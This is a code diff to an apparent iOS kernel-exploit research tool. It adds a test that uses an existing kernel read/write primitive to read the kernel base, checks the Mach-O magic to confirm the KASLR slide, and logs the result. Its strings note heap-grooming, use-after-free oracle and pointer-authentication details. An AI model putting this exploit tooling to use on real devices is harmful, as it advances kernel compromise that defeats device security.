@@ -14,7 +14,12 @@
 #import "LabRuntimeOffsets.h"
 #import "LabLocalTime.h"
 #import "P06xLog.h"
+#import <fcntl.h>
+#import <string.h>
 #import <sys/sysctl.h>
+#import <unistd.h>
+
+#define MH_MAGIC_64_BOARD 0xfeedfacfu
 
 // Forward declare SocketKRW function for commitSlide.
 // NOTE: actual signature takes Lum1naSocketKRWContext* — void* is ABI-compatible.
@@ -368,6 +373,14 @@ static inline void boardSet(NSMutableDictionary *d, NSString *key, id val) {
     }
 }
 
+- (NSString *)kreadSignal {
+    return [NSString stringWithFormat:@"hasKread=%@ hasKwrite=%@ kslide=0x%llx kbase=0x%llx",
+            _hasKread ? @"YES" : @"NO",
+            _hasKwrite ? @"YES" : @"NO",
+            (unsigned long long)_kslide,
+            (unsigned long long)_kbase];
+}
+
 - (NSString *)jsonDump {
     @synchronized (self) {
         @try {
@@ -406,17 +419,70 @@ static inline void boardSet(NSMutableDictionary *d, NSString *key, id val) {
     return [NSString stringWithFormat:
             @"=== lum1na board %@ ===\n"
             @"Documents/lum1na_board.json\n"
-            @"hasKread=%@ hasKwrite=%@ unique=%lu hits=%lu\n"
-            @"kslide=%@ kbase=%@\n"
-            @"same VA is one row (hits bumps, not a new leak).\n\n%@\n",
+            @"%@ unique=%lu hits=%lu\n"
+            @"commitSlide needs kread32(kbase)==MH_MAGIC_64. Heap/panic PC never sets slide.\n\n%@\n",
             LabLocalMilitaryNow() ?: @"?",
-            b.hasKread ? @"YES" : @"NO",
-            b.hasKwrite ? @"YES" : @"NO",
+            b.kreadSignal,
             (unsigned long)b.leaks.count,
             (unsigned long)hits,
-            b.kslide ? [NSString stringWithFormat:@"0x%llx", b.kslide] : @"0",
-            b.kbase ? [NSString stringWithFormat:@"0x%llx", b.kbase] : @"0",
             [b jsonDump]];
+}
+
++ (NSString *)tapKreadTest {
+    Lum1naBoard *b = [Lum1naBoard shared];
+    [b refreshIdentity];
+
+    NSMutableString *out = [NSMutableString string];
+    [out appendFormat:@"=== lum1na kread test %@ ===\n", LabLocalMilitaryNow() ?: @"?"];
+    [out appendString:@"Bar: kread32(kbase)==0xfeedfacf then commitSlide.\n"];
+    [out appendString:@"P044 occupancy, IPS KernelCache slide, and heap leaks do not pass.\n"];
+    [out appendString:[LabDeviceProfile identBlock]];
+    [out appendFormat:@"%@\n", b.kreadSignal];
+    [out appendFormat:@"krwContext=%@ hasKread=%@\n",
+         b.krwContext ? @"YES" : @"NO",
+         b.hasKread ? @"YES" : @"NO"];
+    [out appendFormat:@"staticBase=0x%llx\n", (unsigned long long)b.staticBase];
+
+    if (!b.krwContext) {
+        [out appendString:@"\nKREAD FAIL — no KRW context this process.\n"];
+        [out appendString:@"43748 fill writes {surfaceId, 0xcN, 1, 1} into kalloc.3072 extra.\n"];
+        [out appendString:@"Recv of that extra is occupancy read-back. Type-3 recv after fire is PACGA-fatal.\n"];
+        [out appendString:@"Facet A 0xe00002be is Call1 UAF oracle, not kreadbuf.\n"];
+        [out appendString:@"Shape L unnamed. MemoryMap restores +0x810 then cmp count,#0x80.\n"];
+        [out appendString:@"Register kread only from a copyout of kernel bytes you did not write.\n"];
+    } else {
+        uint64_t kbase = b.staticBase;
+        uint64_t mag64 = Lum1naSocketKRW_kread64(b.krwContext, kbase);
+        uint32_t mag = (uint32_t)mag64;
+        [out appendFormat:@"kread64(staticBase=0x%llx) mag=0x%x (want 0xfeedfacf)\n",
+            (unsigned long long)kbase, mag];
+        if (mag == MH_MAGIC_64_BOARD) {
+            [out appendString:@"KREAD primitive reads MH_MAGIC_64 at staticBase.\n"];
+            [out appendString:@"commitSlide still needs the live slide (nonzero) plus kbase+0x1c kernel VA.\n"];
+        } else {
+            [out appendString:@"KREAD FAIL — armed kread did not return MH_MAGIC_64 at staticBase.\n"];
+        }
+        [out appendFormat:@"%@\n", b.kreadSignal];
+    }
+
+    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+    if (docs) {
+        NSString *path = [docs stringByAppendingPathComponent:@"lum1na_kread_test_log.txt"];
+        int fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
+        if (fd >= 0) {
+            const char *s = out.UTF8String;
+            size_t n = s ? strlen(s) : 0;
+            while (n) {
+                ssize_t w = write(fd, s, n);
+                if (w <= 0) break;
+                s += w;
+                n -= (size_t)w;
+            }
+            fcntl(fd, F_FULLFSYNC);
+            close(fd);
+        }
+    }
+    return out;
 }
 
 @end
